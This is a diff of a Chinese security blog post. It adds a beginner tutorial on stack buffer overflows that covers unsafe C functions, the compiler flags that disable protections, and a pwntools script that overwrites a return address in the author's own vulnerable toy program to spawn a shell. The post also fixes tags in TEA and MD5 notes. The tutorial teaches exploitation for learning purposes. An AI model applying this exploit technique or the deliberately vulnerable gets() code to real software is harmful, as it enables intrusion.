@@ -10,13 +10,97 @@
 <p>栈的生长方向是向低地址生长 也就是压栈时数据是先放到高地址的地方<br>这里栈的概念是和数据结构中的栈一致的 即一种<strong>FILO</strong>(first in last out)的数据结构</p>
 <p>而在汇编层面上 函数调用时会进行保存现场操作 即保存函数调用前寄存器的状态 通常在进入函数体时 栈内就已经有数据了 通常的排布如下</p>
 <figure class="image-box">
-                <img src="https://ae01.alicdn.com/kf/H55d75d798d1e4c43b34aca1f3bc96baeA.png" alt title class>
+                <img src="https://ae01.alicdn.com/kf/H38d1f8f92100468f9a51b205dea97fcak.png" alt title class>
                 <p></p>
             </figure>
 
-<p>这里参数是从左向右入栈还是从右向左入栈取决于调用方法 在这里我们不做讨论 EBP保存的是在函数调用前栈底的位置 <em>当栈清空时栈顶自然回位所以不必保存栈顶指针</em> EIP则保存的是当函数调用完毕后<strong>需要执行</strong>的指令地址 </p>
+<p>这里参数是从左向右入栈还是从右向左入栈取决于调用方法 在这里我们不做讨论 EBP保存的是在函数调用前栈底的位置 <em>当栈清空时栈顶自然回位所以不必保存栈顶指针</em> 返回地址则保存的是当函数调用完毕后<strong>需要执行</strong>的指令地址 在函数调用结束的时候 栈的情况就是按相反方向出栈<br>即 先弹出局部变量 然后弹出EBP到EBP寄存器中 最后弹出返回地址到EIP寄存器中 而参数则是直接使用<strong>ADD ESP</strong>让他们直接消失在栈中</p>
 </blockquote>
-<script>
+<p>在大致了解了下汇编层面的函数调用和栈知识 我们就可以来了解栈溢出漏洞是怎么造成的了..栈溢出漏洞即字面意思 就是向栈中写入了超过限定长度的数据 导致溢出的数据覆盖栈中其他数据 从而影响程序的运行</p>
+<p>最开始的时候 栈溢出漏洞主要是用来破坏 即破坏程序的栈中内容 从而是程序异常退出 但是渐渐的 我们发现 如果计算好溢出数据的长度 让特定数据覆盖在原本的返回地址上 那我们即可以控制程序流向 从而达到影响系统的目的 而这种写入超过限定长度的操作主要是利用一些特定的敏感函数造成的</p>
+<h2 id="敏感函数"><a href="#敏感函数" class="headerlink" title="敏感函数"></a>敏感函数</h2><h3 id="gets"><a href="#gets" class="headerlink" title="gets()"></a>gets()</h3><h4 id="函数原型"><a href="#函数原型" class="headerlink" title="函数原型"></a>函数原型</h4><pre class=" language-C"><code class="language-C">char *gets(char *str)</code></pre>
+<h4 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h4><p>从输入缓冲区读取一个字符串存储到指针指向的内存空间 注意 使用gets()时 系统会自动将最后输入的换行符取出来然后丢弃 也就是如果后续需要继续赋值是不需要吸收回车的 但是gets()函数有一个非常大的缺陷 即他不检查预留存储区是否能够容纳实际输入的数据 简单来说就是有造成内存越界的危险</p>
+<h3 id="read"><a href="#read" class="headerlink" title="read()"></a>read()</h3><h4 id="函数原型-1"><a href="#函数原型-1" class="headerlink" title="函数原型"></a>函数原型</h4><pre class=" language-C"><code class="language-C">ssize_t read(int fd,void *buf,size_t nbyte)</code></pre>
+<p>fd:文件描述符 fd为0即从键盘读取<br>buf:指定的缓冲区 即指针 指向一段内存空间<br>nbyte: 要读入文件指定的字节数</p>
+<h4 id="功能-1"><a href="#功能-1" class="headerlink" title="功能"></a>功能</h4><p>read()函数会把参数fd指向的文件传送nbyte个字节到buf指针所指的内存中 如果nbyte为0 则read()不会有任何作用并返回0 但是如果指定的字符大于缓冲区能容纳的字节数 read()函数也不会进行任何检查 即有可能造成内存越界</p>
+<h3 id="strcpy-和memcpy-和strncpy"><a href="#strcpy-和memcpy-和strncpy" class="headerlink" title="strcpy()和memcpy()和strncpy()"></a>strcpy()和memcpy()和strncpy()</h3><h4 id="函数原型-2"><a href="#函数原型-2" class="headerlink" title="函数原型"></a>函数原型</h4><pre class=" language-C"><code class="language-C">char *strcpy(char *dest,const char* src)
+void *memcpy(void *dest,const void *src,size_t count)
+char *strncpy(char *dest,char *src,int size_t n)</code></pre>
+<p>dest:指向用于储存复制内容的目标函数<br>src:要复制的字符串<br>count:要读入文件指定的字节数</p>
+<h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><p>strcpy()提供了字符串的复制 即strcpy()只用于字符串的复制 而且他不仅复制字符串的内容 还会复制字符串的结束符’\0’</p>
+<p>复制的内容不同 strcpy()只复制字符串 而memcpy()可以复制任意内容 如字符数组 整型 结构体 类等</p>
+<p>复制的方式不同 strcpy不需要指定长度 他遇到’\0’才会停止 所以可能会造成溢出 memcpy()则是根据第三个参数决定复制的长度</p>
+<p>strncpy()函数 只是将src的前n个字符 复制到dest的前n个字符 不自动添加’\0’ 如果src的长度小于n个字节 则以null填充dest知道复制完n个字节</p>
+<h2 id="在没有保护的情况下利用"><a href="#在没有保护的情况下利用" class="headerlink" title="在没有保护的情况下利用"></a>在没有保护的情况下利用</h2><blockquote>
+<p>需要的前置知识: 基本的python语法 pwntools模块的使用语法 栈的结构 汇编层面的函数调用</p>
+</blockquote>
+<p>首先这是我自己写的小案例 源码如下</p>
+<pre class=" language-C"><code class="language-C">#include <stdio.h>
+#include <stdlib.h>
+
+void hello()
+{
+      char a[100];
+      gets(a);
+}
+
+void pwn()
+{
+      system("/bin/sh");
+}
+
+int main(void)
+{
+      hello();
+      return 0;
+}</code></pre>
+<p>在乌班图上使用GCC编译 首先我们关闭所有的保护 这里我是将程序编译成32位 64位同理</p>
+<blockquote>
+<p>NX：-z execstack / -z noexecstack (关闭/开启) 栈执行</p>
+<p>Canary：-fno-stack-protector / -fstack-protector / -fstack-protector-all (关闭/开启/全开启) 栈中插入cookie信息</p>
+<p>PIE：-no-pie / -pie (关闭/开启) 地址随机化</p>
+<p>RELRO：-z norelro / -z lazy / -z now (关闭/部分开启/完全开启) 对GOT表具有写权限</p>
+</blockquote>
+<p>使用checksec 查看程序保护</p>
+<figure class="image-box">
+                <img src="https://ae01.alicdn.com/kf/H4e535c2f20cf4afa80cadf6a4e66137ac.png" alt title class>
+                <p></p>
+            </figure>
+
+<p><em>这里我忘记关闭RELRO保护了</em></p>
+<p>打开IDA 反编译一下 发现所有函数都正常读入</p>
+<figure class="image-box">
+                <img src="https://ae01.alicdn.com/kf/Hed74694200524a87b334d09a04ad627dK.png" alt title class>
+                <p></p>
+            </figure>
+
+<p>阅读源码 发现在hello()函数中存在敏感函数gets() 确定溢出点 在IDA中双击s查看栈图</p>
+<figure class="image-box">
+                <img src="https://ae01.alicdn.com/kf/H21f396218fab4b79b76116dc1145db58r.png" alt title class>
+                <p></p>
+            </figure>
+
+<p>栈图如下 可以发现 变量s的初始地址到返回地址的偏移是 6C+4=70个字节 那我们的基本思路就是 向程序中填入70个无用字节 然后将返回地址覆盖成函数pwn()的地址 这样我们就可以拿到终端</p>
+<figure class="image-box">
+                <img src="https://ae01.alicdn.com/kf/Hf4f1fafc469b47f4959eee1d90db3989H.png" alt title class>
+                <p></p>
+            </figure>
+
+<p>那么使用pwntools库进行脚本的编写 </p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+sh<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">"./test"</span><span class="token punctuation">)</span>
+payload<span class="token operator">=</span><span class="token string">"1"</span><span class="token operator">*</span><span class="token number">0x70</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x804847E</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<p>执行脚本 得到终端</p>
+<figure class="image-box">
+                <img src="https://ae01.alicdn.com/kf/H8a387bd208744392bc1b83f5d63151234.png" alt title class>
+                <p></p>
+            </figure>
+
+<p>在没有保护的情况下 利用完毕</p>
+<h2 id="在有Canary保护的情况下的利用"><a href="#在有Canary保护的情况下的利用" class="headerlink" title="在有Canary保护的情况下的利用"></a>在有Canary保护的情况下的利用</h2><script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
             if (!el.dataset.src) { return; }
@@ -891,7 +975,9 @@ int main(void)
 {
     int i=0;
     EnBase64();
-    cout<<ans; } < code></ans;></iostream></code></pre><code class="language-C">
+    cout<<ans;
+
+} </code></pre>
 <h2 id="Tea"><a href="#Tea" class="headerlink" title="Tea"></a>Tea</h2><p>在密码学中，微型加密算法（Tiny Encryption Algorithm，TEA）是一种易于描述和执行的块密码，通常只需要很少的代码就可实现。其设计者是剑桥大学计算机实验室的大卫 · 惠勒与罗杰 · 尼达姆</p>
 <p>Tea的实现代码比较固定 这里给出常见Tea加密的实现代码</p>
 <pre class=" language-C"><code class="language-C">#include <stdint.h>
@@ -918,7 +1004,7 @@ void decrypt (uint32_t* v, uint32_t* k) {
         sum -= delta;                                   
     }                                              /* end cycle */
     v[0]=v0; v[1]=v1;
-}</stdint.h></code></pre>
+}</code></pre>
 <p>Tea加密的明显特征是 ==存在一个Image Number:0x9e3779b9== </p>
 <h2 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h2><p>MD5 消息摘要算法（英语：MD5 Message-Digest Algorithm），一种被广泛使用的密码散列函数，可以产生出一个 128 位（16 字节）的散列值（hash value），用于确保信息传输完整一致。MD5 由美国密码学家罗纳德 · 李维斯特（Ronald Linn Rivest）设计，于 1992 年公开，用以取代 MD4 算法。这套算法的程序在 RFC 1321 中被加以规范</p>
 <p>这里给出MD5实现的伪代码</p>
@@ -1002,7 +1088,7 @@ void decrypt (uint32_t* v, uint32_t* k) {
             });
             document.body.appendChild(img);
           });
-      </script></code></body></html>]]></content>
+      </script></body></html>]]></content>
       
         
         <tags>
